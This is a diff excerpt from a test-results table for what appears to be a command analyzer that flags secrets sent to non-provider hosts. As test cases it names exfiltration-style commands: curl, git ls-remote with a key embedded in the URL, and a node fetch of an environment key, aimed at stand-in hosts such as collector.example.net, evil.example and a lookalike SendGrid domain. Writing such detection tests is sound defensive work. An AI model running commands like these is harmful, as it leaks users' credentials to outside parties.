@@ -261,7 +261,7 @@ Declaration sheet, last line:
 | Golden replay (`tests/analysis_replay.rs`, `analyze` without items) | 62074 commands, 0 different lines |
 | `analyze_run` without provider hosts, and with an item without hosts (`a_run_without_provider_hosts_is_unchanged`) | the same as `analyze` |
 | A provider host is allowed (`a_provider_host_is_allowed`, unit test and broker run) | `curl` with an auth header to `api.sendgrid.com` for an item with the SendGrid provider: no flag, the run starts. The same item without a provider: `secret_output`, the run waits. |
-| A foreign host with a secret gets the flag (`a_foreign_host_with_a_secret_is_flagged`, unit test and broker run) | `curl` to `collector.example.net`, `git ls-remote https://x:$KEY@git.example.net/...`, `node -e "fetch(...process.env.KEY)"`, and `api.sendgrid.com.example.net`: `foreign_host`. Without a provider: no `foreign_host`. |
+| A foreign host with a secret gets the flag (unit test `a_foreign_host_with_a_secret_is_flagged`; broker run in `a_provider_host_is_allowed`) | `curl` to `collector.example.net`, `git ls-remote https://x:$KEY@git.example.net/...`, `node -e "fetch(...process.env.KEY)"`, and `api.sendgrid.com.example.net`: `foreign_host`. Without a provider: no `foreign_host`. |
 | The replay fixture sets (2074 commands) with the providers of their four secrets: Supabase, PostgreSQL, Resend, Twilio (`provider_hosts_change_only_the_host_flags_on_the_replay_sets`) | 9 commands change. Each one keeps its flags and gets `foreign_host`. All 9 already had `secret_output` (secrets sent to `evil.example`, `webhook.site`, and similar hosts). No flag goes away. No command becomes known safe. |
 
 ## 7. Schema 8
